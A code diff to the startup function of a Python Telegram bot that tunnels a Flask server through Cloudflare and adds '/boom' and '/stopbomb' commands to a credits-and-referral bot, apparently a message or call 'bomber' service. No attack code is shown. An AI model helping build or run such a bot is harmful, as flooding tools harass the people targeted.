 def main():
     db_init()
+    print("[boot] Starting Flask server...")
     port = get_free_port()
-    print(f"[boot] {DEVELOPER_NAME} bot starting...")
-    print(f"[boot] Flask on 127.0.0.1:{port}")
     threading.Thread(target=run_flask, args=(port,), daemon=True).start()
     if not wait_for_server(port):
-        print("[ERROR] Flask failed to start")
+        print("[ERROR] Flask failed to start on port", port)
         sys.exit(1)
-    print("[boot] Flask up!")
+    print(f"[boot] Flask running on 127.0.0.1:{port}")
+
     global WEBAPP_URL
-    tunnel_process = None
     if not WEBAPP_URL:
         print("[boot] Starting Cloudflare tunnel...")
-        WEBAPP_URL, tunnel_process = start_cloudflare_tunnel(port)
+        WEBAPP_URL = start_cloudflare_tunnel(port)
     else:
         print(f"[boot] Using WEBAPP_URL: {WEBAPP_URL}")
+
+    print("\n[boot] Starting Telegram Bot Polling...")
     
-    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
-    
-    # Basic Commands
-    application.add_handler(CommandHandler("start", cmd_start))
-    application.add_handler(CommandHandler("balance", cmd_balance))
-    application.add_handler(CommandHandler("credits", cmd_balance))
-    application.add_handler(CommandHandler("refer", cmd_refer))
-    
-    # Callbacks
-    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(check_join|balance)$"))
-    application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^admin_"))
-    
-    # Message Handler for Admin inputs
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    try:
-        application.run_polling(allowed_updates=Update.ALL_TYPES)
-    finally:
-        if tunnel_process:
-            print("[boot] Shutting down tunnel...")
-            tunnel_process.terminate()
+    while True:
+        try:
+            application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+            application.add_handler(CommandHandler("start", cmd_start))
+            application.add_handler(CommandHandler("boom", cmd_boom))
+            application.add_handler(CommandHandler("stopbomb", cmd_stopbomb))
+            application.add_handler(CommandHandler("balance", cmd_balance))
+            application.add_handler(CommandHandler("credits", cmd_balance))
+            application.add_handler(CommandHandler("refer", cmd_refer))
+            application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(check_join|balance)$"))
+            application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^admin_"))
+            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+            
+            application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
+            
+        except Conflict:
+            print("\n[WARNING] Conflict Error Detected! Another instance is running.")
+            print("[WARNING] Waiting 10 seconds before retrying...")
+            time.sleep(10)
+        except (NetworkError, TimedOut) as e:
+            print(f"\n[WARNING] Network Error: {e}. Retrying in 5 seconds...")
+            time.sleep(5)
+        except Exception as e:
+            print(f"\n[ERROR] Unexpected Bot Crash: {e}. Restarting in 5 seconds...")
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
